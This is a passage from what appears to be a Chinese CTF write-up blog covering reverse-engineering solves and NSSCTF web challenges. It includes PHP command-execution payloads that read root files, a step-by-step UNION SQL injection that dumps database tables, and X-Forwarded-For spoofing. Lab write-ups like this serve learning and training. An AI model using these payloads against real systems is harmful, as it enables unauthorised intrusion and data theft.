<span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v[<span class="number">37</span>] = &#123;<span class="number">0x76D42BE1</span>, <span class="number">0xD9DF03C4</span>, <span class="number">0x0BD0A181</span>, <span class="number">0xF10201C0</span>, <span class="number">0xE4592862</span>, <span class="number">0xCA7A6980</span>, <span class="number">0x042150A6</span>, <span class="number">0x2BE23AF3</span>, <span class="number">0x356E5E55</span>, <span class="number">0xC2337C76</span>, <span class="number">0xB7313BD7</span>, <span class="number">0x5B2E1195</span>, <span class="number">0xF59BE5C7</span>, <span class="number">0xD1FE3936</span>, <span class="number">0xBAD4593E</span>, <span class="number">0xC8776223</span>, <span class="number">0xA6ED7222</span>, <span class="number">0x811C4F11</span>, <span class="number">0x4FAD07DC</span>, <span class="number">0xD36AA578</span>, <span class="number">0x0230540B</span>, <span class="number">0xF89E6C42</span>, <span class="number">0x6D27DD7D</span>, <span class="number">0xECF5B7C3</span>, <span class="number">0xA9346EEC</span>, <span class="number">0xC81EF864</span>, <span class="number">0xAE305136</span>, <span class="number">0xB0DCD19A</span>, <span class="number">0x9149D1C7</span>, <span class="number">0xA593BD5F</span>, <span class="number">0x0458FCCA</span>, <span class="number">0x5A5BDBAF</span>, <span class="number">0x1C1C2221</span>, <span class="number">0x87DFA0FF</span>, <span class="number">0x4753CF52</span>, <span class="number">0x5D696B28</span>, <span class="number">0x422A7BB4</span>&#125;;</span><br><span class="line">    </span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> key[<span class="number">5</span>] = &#123;<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> y,z,p,rounds,e;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">37</span>;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">    y = v[<span class="number">0</span>];</span><br><span class="line">    sum = rounds*delta;</span><br><span class="line">     <span class="keyword">do</span></span><br><span class="line">     &#123;</span><br><span class="line">        e = sum &gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span>(p=n<span class="number">-1</span>;p&gt;<span class="number">0</span>;p--)</span><br><span class="line">        &#123;</span><br><span class="line">            z = v[p<span class="number">-1</span>];</span><br><span class="line">            v[p] -= ((((z&gt;&gt;<span class="number">5</span>)^(y&lt;&lt;<span class="number">2</span>))+((y&gt;&gt;<span class="number">3</span>)^(z&lt;&lt;<span class="number">4</span>))) ^ ((key[(p&amp;<span class="number">3</span>)^e]^z)+(y ^ sum)));</span><br><span class="line">            y = v[p];</span><br><span class="line">        &#125;</span><br><span class="line">        z = v[n<span class="number">-1</span>];</span><br><span class="line">        v[<span class="number">0</span>] -= (((key[(p^e)&amp;<span class="number">3</span>]^z)+(y ^ sum)) ^ (((y&lt;&lt;<span class="number">2</span>)^(z&gt;&gt;<span class="number">5</span>))+((z&lt;&lt;<span class="number">4</span>)^(y&gt;&gt;<span class="number">3</span>))));</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        sum = sum-delta;</span><br><span class="line">     &#125;<span class="keyword">while</span>(--rounds);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c%c%c%c&quot;</span>,*((<span class="type">char</span>*)&amp;v[i]<span class="number">+0</span>),*((<span class="type">char</span>*)&amp;v[i]<span class="number">+1</span>),*((<span class="type">char</span>*)&amp;v[i]<span class="number">+2</span>),*((<span class="type">char</span>*)&amp;v[i]<span class="number">+3</span>));</span><br><span class="line">        <span class="comment">//printf(&quot;%c%c%c%c&quot;,*((char*)&amp;v[i]+3),*((char*)&amp;v[i]+2),*((char*)&amp;v[i]+1),*((char*)&amp;v[i]+0));</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NWMyMjAwYWUxN2RhN2EzNDg0MjQ3NzRiMDA2ZjM2NDBfMVV6QnBUcU9WUFAzMDhTc2NmSXQ2OWdCdHlZYVNKbkZfVG9rZW46WHI3V2JwSkRub204MDF4S0puMGNxWXFRbnRoXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QLNU&#123;^_^yoU_MuST_1iK3_Th3_t34_pR0m4x&#125;</span><br></pre></td></tr></table></figure><h2 id="deepsleep"><a href="#deepsleep" class="headerlink" title="deepsleep"></a>deepsleep</h2><p>先拖进die中进行查看，没有加壳</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjA5ZTcyZjQ3MDExZWE2MzYwODZkOTZmMGQ1YTBjOTJfVjFnSXJqa1l3YlBSSmhkWkwxbG5PSEFSdlZLazhLbW1fVG9rZW46TnVnQWJRTnB6b3E2ZG14NHA0Y2NJSUI3blVkXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>那我们就直接拖进ida中查看main函数</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=OWQ2MDAyYTFmOGJlZmVkZDg5N2QxNTI0ZWRhYjc5MzBfeHhmbndwRndtcUxRbThoQnNxU3ZMQ05UNWxFRnpQQ0ZfVG9rZW46UjU2NmJJTjV1b1E4aGt4dGlUZ2NrMXJkbjhDXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>用户输入的为24字节的Arglist</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.rdata:<span class="number">00402220</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span>+xmmword_402220 xmmword <span class="number">4040404040404040404040404040404</span>h</span><br><span class="line">.rdata:<span class="number">00402220</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span> <span class="number">04</span>                                           ; DATA XREF: _main+<span class="number">157</span>↑r</span><br><span class="line">.rdata:<span class="number">00402230</span> <span class="number">55</span> <span class="number">48</span> <span class="number">4</span>A <span class="number">51</span> <span class="number">7F</span> <span class="number">73</span> <span class="number">34</span> <span class="number">5B</span> <span class="number">6</span>C <span class="number">45</span>+xmmword_402230 xmmword <span class="number">6</span>A656D7C5B6D456C5B34737F514A4855h</span><br></pre></td></tr></table></figure><p>前十六位和16个进行异或，后8位和4进行异或</p><p><code>C[whAaTy</code>后8位预计输出的内容，将两端内容进行拼接，获取最后的flag</p><p>利用脚本进行拼接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_re_challenge</span>():</span><br><span class="line">    <span class="comment"># 根据用户提供的数据段信息</span></span><br><span class="line">    <span class="comment"># xmmword_402220 是 16 个 0x04</span></span><br><span class="line">    xor_key = <span class="string">b&#x27;\x04&#x27;</span> * <span class="number">16</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># xmmword_402230 的字节序列（从 .rdata 段提取）</span></span><br><span class="line">    xmm230_bytes = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;55484A517F73345B6C456D5B7C6D656A&quot;</span>)  <span class="comment"># 共16字节</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 加密后的后8字节数据（固定字符串 &quot;C[whAaTy&quot;）</span></span><br><span class="line">    encrypted_part2 = <span class="string">b&#x27;C[whAaTy&#x27;</span>  <span class="comment"># 原始字节：43 5B 77 68 41 61 54 79</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解密前16字节：encrypted_part1 = xmm230_bytes，密钥为 xor_key (0x04*16)</span></span><br><span class="line">    decrypted_part1 = <span class="built_in">bytes</span>([a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(xmm230_bytes, xor_key)])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解密后8字节：异或 0x04</span></span><br><span class="line">    decrypted_part2 = <span class="built_in">bytes</span>([c ^ <span class="number">0x04</span> <span class="keyword">for</span> c <span class="keyword">in</span> encrypted_part2])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 组合得到原始输入（flag）</span></span><br><span class="line">    flag = decrypted_part1 + decrypted_part2</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行解密并输出结果</span></span><br><span class="line">flag = decrypt_re_challenge()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;解密后的Flag:&quot;</span>, flag.decode(<span class="string">&#x27;latin1&#x27;</span>))  <span class="comment"># 处理可能的非ASCII字符</span></span><br></pre></td></tr></table></figure><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=M2I2ZDFkMmU5NmVjOTY0YTdhNTQ2ODQ1MTZjZmVkYmZfRmU3OXFCMEtaek1NekpRUGxsdFdhWHhZSk1razVzcmZfVG9rZW46U3IxWGJFb1JIb3ZoUEh4Qk0wSGMxMENTbkZnXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>获得flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QLNU&#123;w0_hAi_xianG_slEeP&#125;</span><br></pre></td></tr></table></figure><h2 id="HUA"><a href="#HUA" class="headerlink" title="HUA"></a>HUA</h2><p>先拖进die中</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MjU5NjVkMmI4OTBlNjEyYWEyZTFjNGVkNjRlY2MyOGVfRVE2WFhHcXZ6Z0lEUWdTdlJuQTVLOFQ2b1hOczRyOWNfVG9rZW46TExrOWJ4MmFDb1ZPQVl4c1llVGM1WWo4bmhnXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>脱壳</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjZjODY5ODdhZDMwNTNmZmMxZDcxOGVmYjdiMjgyZWNfWnRRMkNVN09UNGRKdlpYNDdieGNkRHBQSnUxR3h2VHdfVG9rZW46TWJLcGJWRUs5b1VwU3Z4cW1ycWNtQ3NabnBoXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>脱壳完成后，拖进ida中</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=YjBmMmE2NWM4ZGVjMDQ1NjRlNjUwOWJjNmNkZTJmZWJfd3hsRjUxVjdINlJ5ak0yZk9jOWxmUjhrVmNWMDRhMWFfVG9rZW46V1YySWJKaENSb2VYcDV4WkJnRGN3REZQbnNlXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>看到有一处标红，可能是花指令</p><p>把它nop掉</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NTYzNjYxYWUzZTkxMWM3NzhkYzNkNTg1ZGZkNDNiYzdfZG9DQnRmRHk2TXZsSkxFV3Fobk43OTd5dE10MHdLQXFfVG9rZW46RGpySmJSOWdLbzFPSHV4QW5TY2NzbUd2bnlkXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MWZjOWFjYWE0NGM3ZjdlNThkZDQ1MWY0NjU4YjJiY2Vfc2FGVEg3cmZkd0huaEV5b3ZYVEZzV0JkQk9PVUliTGJfVG9rZW46SFR1WWI4bkY2b3FmeWF4MmZRdWNDNWJLbk9oXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=Mzg3MzY3MTQ2MWMyMDhiNWFhYmNhNmNiN2ZhODllZTZfMHpBSDVYbDBCVGVrMTZQa09LMjIxMWFuWlZ1WlJQUEdfVG9rZW46RGFrbWJ4am8ybzhpaTZ4QzdUaGN5djc5bkdnXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=YmUwMzJkY2Q5ZjVhYjFkZjMxYWYwZjIzOWRiYzBmNmJfcVBpMExWQTYyazg2cUh3TGM3VXJ6SXpvYjQxcE1rOXlfVG9rZW46QlpXTWJNTkIybzJONW14Z1hvR2NPczNCbjllXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTIyYWUwNDdmZWQ0YmIwYmQ3M2RmZmZkMmM2OTFmMzdfWXNjcElacUFYc0NsQlNKZHlJdWlXWWZHSVE0OXZjczlfVG9rZW46WGU5NmJESjltb0xMRll4R1JHQmNyN1lGbmljXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>找到 地图</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjUyMWFkZGE5NmRiN2IyZGFjMjM1NWUzNjY1YzNjYWJfVTY1dFpjSlRKSWQ0a1RIQnJFcjkwMTVWNkE2T0VFTjFfVG9rZW46Q3BWU2JtSDl3b1hIMlV4UlhWOGMxSnJrbnNmXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MGQwN2RkYjc5MzM4NzA4MGZjYzk0ZGFjOWRlMzEyN2NfckNnbjUyUk9iaGVRY1BEZkN2ZjRqUjRTaGgweHZJUkZfVG9rZW46UkFhcmJVMXFob294TDJ4MEo0aWNyU3U2bjVlXzE3NDU4NDQwMDk6MTc0NTg0NzYwOV9WNA" alt="img"></p><p>得到flag<code>QLNU&#123;ssaaasaassdddw&#125;</code>S</p>]]></content>
      
      
      <categories>
          
          <category> re </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>week4-web-例题</title>
      <link href="/2025/04/28/week4-web-%E4%BE%8B%E9%A2%98/"/>
      <url>/2025/04/28/week4-web-%E4%BE%8B%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="LitCTF-2023-PHP是世界上最好的语言！！"><a href="#LitCTF-2023-PHP是世界上最好的语言！！" class="headerlink" title="[LitCTF 2023]PHP是世界上最好的语言！！"></a>[LitCTF 2023]PHP是世界上最好的语言！！</h2><p>根据提示已知flag位于根目录</p><p>我们先进去看一看</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MGQzNWFjMmY3NDE5MTQ0MjgyZWZhYThlYTZiMjhlY2NfdnhRVHlPQ2ZFQTJxdGVyZVB2MUs3UUdiVW02cHp4MGJfVG9rZW46U20xU2J3ZWFlb3NYMlN4a014dGNXUkFDbkxmXzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><p>看到上面的这个页面，从run code可以看出，这是可以执行命令</p><p>我们需要构造payload,<code>system(&quot;ls /&quot;);</code>输出如下：</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=OTc0NmUzMTZjN2Q4NjBmMjllYWU2ZmYyNjA0MTRiYWZfcVdVYUYzVmJFUkgyMW9hT1ZpcXJma1dEc0JEeUxIRzNfVG9rZW46UWRkaWJMVU5hb0gwY2d4ZE91ZmNMZEdFblZnXzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><p>已知flag位于根目录，我们cat一下</p><p>我们尝试Flag是不行的，再尝试一下flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;cat /Flag&quot;);     system(&quot;cat /flag&quot;);</span><br></pre></td></tr></table></figure><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTg4OGRlMDAzNjNhZmU3MzkwNmI4NzdkMmI2NTlmODRfUkY4Y1FaVHExeDVrSlRnQVhUWTk0T25lbFplYWNFQmFfVG9rZW46QlA0bGJKT1J1b2Uyd3Z4aUlzSmNFVGsxbjJlXzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><p><strong><code>NSSCTF&#123;54391812-9444-4e1c-85ef-e2f448d3aec3&#125;</code></strong></p><h2 id="SWPUCTF-2021-新生赛-easy-sql"><a href="#SWPUCTF-2021-新生赛-easy-sql" class="headerlink" title="[SWPUCTF 2021 新生赛]easy_sql"></a>[SWPUCTF 2021 新生赛]easy_sql</h2><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=OWE0NTdhMTU2OWM3MzNkNTNlZDBjMTQ5NTg5YjY3ZWZfMmFrVlJjQ2I3Ymc1MHppWndMRlhuazYyRlJibU5YTk9fVG9rZW46U2ZtSmIyNmZjb0tBbTV4RXpWTWNsNTZSbjlmXzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><p>又看到了</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NGI4NDdlNjg1Y2NkNTUyM2FhYzQ5NjA3NzljZDgyMmNfMG12M000WXpuZ0lsb0lzQmVrWHhXc1p2dTRUVHFuc2JfVG9rZW46Q0pHcWI0S0ZFb3Z6RjJ4d2R2emNMUElMbmNnXzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><p>我们查询一下字段数，得到字段数为3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=1&#x27; order by 3 --+</span><br></pre></td></tr></table></figure><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MGE3ZTc4NWZmMzU0YWMwYzgwYjgyZWUyNDcyM2UwMzFfTDZPck1lNzdxalZORTg1WHFSOFlSNWxZS1ByRTVvRW5fVG9rZW46TWpkYWJoSkFDb3B0Rkh4ZzJqUGNldVlxbk5kXzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NDhlOTExMjI5NTRiOGJkZjI4MjZlMGNmNjgwOWFmYzZfeXZFR2M1VkVjQzNXTExGWXdqajJQTmJkRDR2OXVhV2tfVG9rZW46RjZkQmJpMEY0b1pIZXZ4Q0ZZTGN0Zm5lbkJkXzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><p>我们进行语句查询</p><p><code>?wllm=-1&#39; union select 1,2,3 --+</code>，找到了回显点</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MzNhZTc1YTYzZDE4NDA5YzAwZDYwZThkZWFmZWEyYmJfOVA3c2lTYTlzajhnQXI0M2ViSjB3VUs2c284eXJha1NfVG9rZW46WmhlVmJQYm1GbzI2WXd4WFRBR2NNaGJlbmhjXzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><p>这样我们就得到了位置</p><p>第二行为name，第三行为password</p><p>继续查数据库名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27; union select 1,2,database() --+</span><br></pre></td></tr></table></figure><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDc1ZGUyYzdmMzY0ZWVhYWI3MWQxNTU0NGQ1NGJkYzZfNnIxOW1ncW16OWg2ZGMxRlJYREk1NnJjc1VOYUlCaVNfVG9rZW46TVRkWWJxRlFMbzFPZXJ4dUZkS2MybDZLblViXzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><p>继续查表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;test_db&#x27;--+</span><br></pre></td></tr></table></figure><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MGZjMjk5NmExOTE3OGFmNzI1MDk0N2ZiOWE1YWM2ZjhfNTkxSU9YRzBhd3ZIcFF4b2tHalNWZkZpZ0lTVTl3aE1fVG9rZW46V2JlTmIxQjRtb0tENGV4Mk1LRmNTN083bllkXzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><p>继续查两张表中的字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;users&#x27;--+</span><br><span class="line">?wllm=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;test_db&#x27;--+</span><br></pre></td></tr></table></figure><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MTJlZmM4N2Q1MWMxZjJlMzI4ZjYyYTAyZjhmNTdiYmZfZnRJbE1SSW5SZ2x4TEV3eXZFb2t2a3lza2xMb3h3bGlfVG9rZW46QUlYSGJOVTRIbzJZMnJ4bFhiemNxR0xvbjdjXzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NjA5OGY4MmY0NTBkOWZkZjEwYzkyODkyYWNhZWNmN2ZfcnBzeEpXNzNBRXVmT2hIQ0sxdFZyeFZzZElLQ1lwREpfVG9rZW46VnBFbWJycnlhb0Q4M1Z4bmhkNWNQWmtYbktnXzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><p>在test_db表中看到了我们要的flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?wllm=-1&#x27; union select 1,2,flag from test_tb --+</span><br></pre></td></tr></table></figure><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MzAyZGM4MGVmMjVjNzc3NDViNmE2ZmE2MjA3ZGZhNDFfYmw5d2NWZGpiMmMzUkdwMkpIVW5saFU3RW5CejY5S3ZfVG9rZW46UWJRN2JEQkRWb1Q5NXd4ZG50OGNnaEd2bkdoXzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;4bd24c9e-1d76-4553-a818-8e715fa5c15e&#125;</span><br></pre></td></tr></table></figure><h2 id="SWPUCTF-2021-新生赛-Do-you-know-http"><a href="#SWPUCTF-2021-新生赛-Do-you-know-http" class="headerlink" title="[SWPUCTF 2021 新生赛]Do_you_know_http"></a>[SWPUCTF 2021 新生赛]Do_you_know_http</h2><h3 id="方法一：利用burp"><a href="#方法一：利用burp" class="headerlink" title="方法一：利用burp"></a>方法一：利用burp</h3><p>打开后</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NDcxMjgzNDQwNTljMWQ5NmE5YTU3ZjdiZjhiZTRhNjNfem5Mc1pUb3ZtWjhsS3pScWV6UGkwd0VORk9qbnNONXVfVG9rZW46R1FEb2JuaWRpbzhyc1R4WVh2ZWNwZTZsbnBoXzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><p>提示我们使用WLLM</p><p>直接利用burp改服务器，现在是这样的</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MTk0YzVkODFjYmYyYzEyOGNjMGVkMTViODNjYTE0YzhfYmJuVGtyMGhacnRnUHB0Q0pjWHFtd0lGMndFd2g1VG1fVG9rZW46WFpKVGJCZndSb3BPTGx4NHNCb2NTVExWbnlnXzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><p>进行修改</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=YWJkNTlhNGRhY2VkMTJhZTRmZTFjYTc1MzJiODI4NjVfa29QOEdlQ2hWb3ZSRDltYUJCQmlrTGMwcVJhVVN6ajFfVG9rZW46RTUwemJDS0lob2IzS2N4bDhrZGNPVkIwbjlmXzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=NmQ5OTliMjhhMGUwZDFkMzY0NDcxN2E2NTI3NzIxZDVfRFp1dzQ4RU1CY2VJVmVEQWV2VU9EWFFoQVJtVGVtUE1fVG9rZW46SXRKQWJHZHh4b21NOEN4dkZFTmNiWHVTbm1jXzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><p>看到这里，我们访问一下</p><p><a href="http://node4.anna.nssctf.cn:28123/a.php">http://node4.anna.nssctf.cn:28123/a.php</a></p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTQ1MmQzZmE5OGQ1NGM4OWFhNmEyMmNlZTA1NmZjOGRfd0lsUzYxMWtLdkplQzVubmJDS2dUTkRsd21pdE5KZ0ZfVG9rZW46UUtmZ2IzVjMwbzNLYkx4TWZnVWM0cGZMbm5jXzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><p>我们需要用当地地址进行读取</p><p>添加<code>X-Forwarded-For: 127.0.0.1</code></p><p>最后获得一个secretttt.php文件，进行访问，获得flag</p><h3 id="方法二：利用hacker"><a href="#方法二：利用hacker" class="headerlink" title="方法二：利用hacker"></a>方法二：利用hacker</h3><p>先改浏览器</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MDA3MmRlOTgzMWI4YzVlMWIxNjRiZGRmMjY0ZTU4NzFfYVp2d2JSVXJIU2ViNFJ5OXRFUjVObnpiSW9uNjZ3d2tfVG9rZW46QjJZamJsVWJVb3JlQ0x4bFpTZGNmQXQybnFlXzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><p>发送请求后</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=MDg0MGM2ZTM0ZTkzNWQzZWI3ZTliNGI0NjE1NTg5ZDdfZGNNdDNycThSNG8wR093a05jT3hmNlNqVFBOVlkyb2FfVG9rZW46WG90Q2JzZlJSbzF5UHp4dElxc2NtNTVCbjVlXzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><p>最后再改本地地址</p><p>得到</p><p><img src="https://ucnf2fb2o0n7.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDUzYWI3NDdlY2Y0MWM3NWFmMTg5MDdjYWExZGI4MWRfMUFaRW9mejJBaXFGYlR1ZlhwWGhNdWtleUhVSEk1anNfVG9rZW46QmtxdWJUUUxtb1lGamh4Wm1xWmNLc0Mwbmp6XzE3NDU4NDIzNzE6MTc0NTg0NTk3MV9WNA" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;135fca44-7741-4bc4-abe0-7666573ae7f9&#125;</span><br></pre></td></tr></table></figure><h2 id="LitCTF-2023-我Flag呢？"><a href="#LitCTF-2023-我Flag呢？" class="headerlink" title="[LitCTF 2023]我Flag呢？"></a>[LitCTF 2023]我Flag呢？</h2><p>这道题直接F12，最后就有flag</p><p><img 